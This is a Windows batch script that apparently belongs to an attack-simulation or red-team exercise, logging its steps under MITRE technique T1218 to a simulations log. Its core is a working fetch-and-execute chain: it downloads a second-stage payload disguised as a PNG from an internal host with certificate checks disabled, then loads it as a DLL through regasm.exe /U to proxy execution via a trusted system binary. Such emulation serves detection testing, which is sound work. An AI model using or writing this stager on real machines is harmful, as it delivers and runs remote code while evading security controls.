@echo off
setlocal enabledelayedexpansion

REM Placeholder constant declarations (random-named SET vars, one per PHR_*)
SET aBcDeF12=%APPDATA%\11913\20260496
SET GhIjKl34=4162260e.txt
SET MnOpQr56=https://10.0.0.49/stage/2/icon.png?11913-7
SET StUvWx78=ITZEL-S2B
SET YzAbCd90=11913
SET EfGhIj23=7
SET KlMnOp45=%PUBLIC%\\macula-simulations.log
SET QrStUv67=https://10.0.0.49

REM Cache timestamp for debug logging
SET tsvar=!DATE!/!TIME!

REM === DEBUG: start of script ===
echo [!tsvar!][DEBUG][!StUvWx78!][!YzAbCd90!]: script_start>> "!KlMnOp45!" 2>nul

REM === STEP 1: Heartbeat fetch ===
echo [!tsvar!][DEBUG][!StUvWx78!][!YzAbCd90!]: heartbeat_start>> "!KlMnOp45!" 2>nul
curl -k -s -o "!aBcDeF12!\!GhIjKl34!" "!MnOpQr56!"
set hb_error=%errorlevel%
echo [!tsvar!][DEBUG][!StUvWx78!][!YzAbCd90!]: heartbeat_complete>> "!KlMnOp45!" 2>nul

REM === STEP 2: Change working directory ===
echo [!tsvar!][DEBUG][!StUvWx78!][!YzAbCd90!]: chdir_start>> "!KlMnOp45!" 2>nul
cd /d "!aBcDeF12!" >nul 2>&1
set cd_error=%errorlevel%
echo [!tsvar!][DEBUG][!StUvWx78!][!YzAbCd90!]: chdir_result=!cd_error!>> "!KlMnOp45!" 2>nul

REM === STEP 3: Invoke Stage 2 DLL via regasm.exe /U ===
echo [!tsvar!][DEBUG][!StUvWx78!][!YzAbCd90!]: process_start>> "!KlMnOp45!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U "!GhIjKl34!" >NUL 2>&1
set regasm_error=%errorlevel%
echo [!tsvar!][DEBUG][!StUvWx78!][!YzAbCd90!]: process_end>> "!KlMnOp45!" 2>nul

REM === STEP 4: Generate TTP log line ===
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set timestamp=%%t
if !regasm_error! equ 0 (
    set result=OK
    set error=
) else (
    set result=FAIL
    set error=regasm_failed
)
echo [!timestamp!][TTP][!StUvWx78!][!YzAbCd90!]: T1218^|System Binary Proxy Execution=!result!:!error!>> "!KlMnOp45!" 2>&1

REM === End of script ===
endlocal